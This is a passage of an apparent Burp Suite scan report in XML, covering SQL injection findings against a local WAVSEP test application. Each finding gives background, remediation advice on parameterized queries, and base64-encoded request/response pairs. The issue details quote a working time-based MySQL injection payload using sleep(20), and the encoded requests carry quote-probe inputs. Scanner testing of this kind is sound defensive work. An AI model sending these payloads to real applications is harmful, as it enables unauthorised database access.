0VULU9iZnVzY2F0aW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IExpc3RpbmcgZGF0YWJhc2UgdGFibGVzIGNvbnRlbnRzIGJ5IGluamVjdGluZyBhIGVuY29kZWQgcGF5bG9hZCBjb250YWluaW5nIGFuIGlubGluZSBjb21tZW50cyB0byBieXBhc3MgV0FGLjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2278245395679698944</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case01-InjectionInSearch-RetrieveDatabaseVersion-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case01-InjectionInSearch-RetrieveDatabaseVersion-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VULVVuaW9uRXhwbG9pdC9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1NjoyNiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjI2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIGRhdGFiYXNlIHZlcnNpb24gKEhpbnQ6IE15U1FMKTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtVW5pb25FeHBsb2l0L2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBHRVQgcGFyYW1ldGVyIGluIGEgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXMuIEdvYWw6IHJldHJpZXZlIGRhdGFiYXNlIHZlcnNpb24gKEhpbnQ6IE15U1FMKTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6849445669707602944</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case02-InjectionInSearch-TimeDelay-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-UnionExploit/Case02-InjectionInSearch-TimeDelay-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwP21zZz10ZXh0dmFsdWUnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1VbmlvbkV4cGxvaXQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1NjoyOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
